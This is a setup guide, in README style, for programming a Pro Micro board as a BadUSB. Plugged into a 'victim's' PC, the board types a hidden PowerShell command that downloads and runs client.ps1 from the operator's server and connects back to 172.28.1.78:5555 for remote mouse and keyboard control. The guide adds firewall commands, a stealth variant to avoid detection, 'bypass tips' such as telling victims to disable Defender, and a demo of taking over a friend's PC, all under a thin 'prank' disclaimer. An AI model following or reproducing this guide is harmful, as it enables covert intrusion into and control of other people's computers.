# 🎮 Pro Micro BadUSB Setup Guide

## 📦 What You Need

- **Pro Micro board** (ATmega32U4 - any clone works)
- **Micro USB cable**
- **Arduino IDE** (download from arduino.cc)
- **Computer to program it** (Windows/Mac/Linux)

---

## ⚙️ Setup Arduino IDE

### 1. Install Arduino IDE
Download: https://www.arduino.cc/en/software

### 2. Add Pro Micro Board Support
```
Arduino IDE → File → Preferences → Additional Boards Manager URLs:
https://raw.githubusercontent.com/sparkfun/Arduino_Boards/master/IDE_Board_Manager/package_sparkfun_index.json
```

### 3. Install Board
```
Tools → Board → Boards Manager → Search "SparkFun AVR Boards" → Install
```

### 4. Select Board
```
Tools → Board → SparkFun AVR Boards → SparkFun Pro Micro
Tools → Processor → ATmega32U4 (5V, 16 MHz)
Tools → Port → Select your COM port
```

---

## 🔧 Upload Code

### Step 1: Update IP Address
```cpp
// In ProMicro_Payload.ino (line 18)
const char* TARGET_IP = "172.28.1.78";  // ← YOUR IP HERE!
```

### Step 2: Upload
1. Open `ProMicro_Payload.ino` in Arduino IDE
2. Click **Verify** (✓) - check for errors
3. Click **Upload** (→) - wait for "Done uploading"
4. **DONE!** Pro Micro is now a BadUSB

---

## 🚀 Deployment

### On YOUR Laptop:
```powershell
# Terminal 1 - Web server
python -m http.server 8000

# Terminal 2 - Control server
python server_professional.py

# Terminal 3 - Open firewall
New-NetFirewallRule -DisplayName 'RC' -Direction Inbound -LocalPort 5555,8000 -Protocol TCP -Action Allow
```

### On VICTIM's Laptop:
1. Plug in Pro Micro
2. Wait 3-5 seconds (auto-executes)
3. Unplug Pro Micro
4. Check your server for connection!

---

## 📂 Which File to Use?

| File | Best For | Speed | Stealth |
|------|----------|-------|---------|
| **ProMicro_Payload.ino** | General use | Medium | Good |
| **ProMicro_Compact.ino** | Fast execution | Fast | Medium |
| **ProMicro_Stealth.ino** | Avoid detection | Slow | Best |

**Recommended:** Start with `ProMicro_Payload.ino`

---

## 🔍 Testing

### Test on YOUR PC first:
1. Upload code to Pro Micro
2. Start both servers (web + control)
3. Plug Pro Micro into YOUR PC
4. Watch it execute (Win+R opens, PowerShell runs)
5. Check if connection appears in server GUI

### If it works:
✅ Ready to prank!

### If it fails:
❌ Check:
- Is Python installed?
- Are packages installed? `pip install -r requirements.txt`
- Is firewall open?
- Are you on same WiFi?

---

## ⚡ Execution Flow

```
[Plug Pro Micro]
    ↓
Wait 2 seconds
    ↓
Press Win+R (opens Run dialog)
    ↓
Type: powershell -W Hidden -C "download & run client.ps1"
    ↓
Press Enter
    ↓
PowerShell runs hidden
    ↓
Downloads client.ps1 from your server
    ↓
Executes Python payload
    ↓
Connects to: 172.28.1.78:5555
    ↓
YOUR SERVER GETS CONNECTION!
```

---

## 🐛 Troubleshooting

### Pro Micro not detected:
1. Try different USB port
2. Install CH340 drivers (for clones)
3. Press reset button twice quickly (enters bootloader mode)
4. Try uploading immediately after

### Upload failed:
```
Error: Device not found
```
**Fix:** Press reset button twice quickly, then upload immediately

### Code doesn't execute:
- Victim's PC might have different keyboard layout (US vs UK)
- Increase delays in code
- Try `ProMicro_Stealth.ino` (different method)

### Connection doesn't work:
- Check victim has Python: `python --version`
- Check victim has packages: `pip list | grep pyautogui`
- Check firewall on YOUR laptop
- Check both on same WiFi network

---

## 🎨 Customization

### Change Delays (make faster/slower)
```cpp
delay(2000);  // ← Increase if PC is slow, decrease if fast
```

### Change Execution Method
```cpp
// In setup(), change:
executePayload();        // Default method
executePayloadDirect();  // Direct Python
executePayloadCmd();     // Use CMD instead
```

### Add LED Indicator
```cpp
void setup() {
  pinMode(LED_BUILTIN, OUTPUT);
  
  // Blink when executing
  digitalWrite(LED_BUILTIN, HIGH);
  executePayload();
  digitalWrite(LED_BUILTIN, LOW);
}
```

---

## 🛡️ Bypass Tips

### If victim has UAC (User Access Control):
Code already uses `-NoP` and `-Exec Bypass` to avoid prompts

### If victim has antivirus:
Tell them to disable Windows Defender temporarily

### If PowerShell execution blocked:
Use `ProMicro_Compact.ino` - runs through CMD first

---

## 📊 Comparison: Pro Micro vs Rubber Ducky

| Feature | Pro Micro | Rubber Ducky |
|---------|-----------|--------------|
| Price | $4-8 | $50+ |
| Programming | Arduino IDE (free) | Ducky Script (encoder needed) |
| Speed | Same | Same |
| Detection | Same | Same |
| Reliability | ✅ Excellent | ✅ Excellent |
| **Winner** | 🏆 Pro Micro (cheaper!) | ❌ Expensive |

---

## 🎯 Quick Commands

### Get your IP:
```powershell
ipconfig | Select-String "IPv4"
```

### Test connection:
```powershell
# On victim's PC (before prank)
Test-NetConnection 172.28.1.78 -Port 8000
Test-NetConnection 172.28.1.78 -Port 5555
```

### Kill web server:
```powershell
Ctrl+C in Terminal 1
```

### Kill control server:
```powershell
Ctrl+C in Terminal 2 (or close GUI)
```

---

## 🎬 Full Demo Workflow

```bash
# 1. Program Pro Micro
$ arduino-cli compile -u ProMicro_Payload.ino
Done uploading

# 2. Start servers
$ python -m http.server 8000
Serving HTTP...

$ python server_professional.py
[GUI opens]

# 3. Plug Pro Micro into friend's PC
[3 seconds later...]

# 4. Your GUI shows:
"New connection • 192.168.1.105"

# 5. Enable controls
Click: Mouse Control + Keyboard Control

# 6. You're in! 🎉
[Move their mouse, click, type...]
```

---

## ⚠️ Important Notes

- ✅ **Test locally first** (on your own PC)
- ✅ **Both PCs must be on same WiFi**
- ✅ **Victim needs Python installed**
- ⚠️ **Only prank friends who are OK with it**
- ⚠️ **Don't use on unauthorized systems**
- ⚠️ **This is for education/fun only**

---

## 🔗 Additional Resources

- Arduino Pro Micro Guide: https://learn.sparkfun.com/tutorials/pro-micro--fio-v3-hookup-guide
- Keyboard Library: https://www.arduino.cc/reference/en/language/functions/usb/keyboard/
- CH340 Drivers: https://sparks.gogo.co.nz/ch340.html

---

**Your Pro Micro is ready to prank! 🎮**

Total cost: **$5** vs Rubber Ducky **$50** = **$45 saved!** 💰
